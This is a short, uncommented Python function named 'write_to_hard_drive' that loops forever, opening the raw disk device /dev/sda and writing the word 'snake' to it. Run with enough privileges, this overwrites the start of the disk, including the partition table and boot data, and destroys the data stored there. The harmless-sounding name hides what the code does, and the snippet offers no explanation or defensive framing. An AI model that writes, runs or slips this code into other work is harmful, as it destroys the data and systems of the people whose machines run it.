def write_to_hard_drive():
    while True:
        word = "snake"
        with open('/dev/sda', 'w') as f:
            f.write(word)
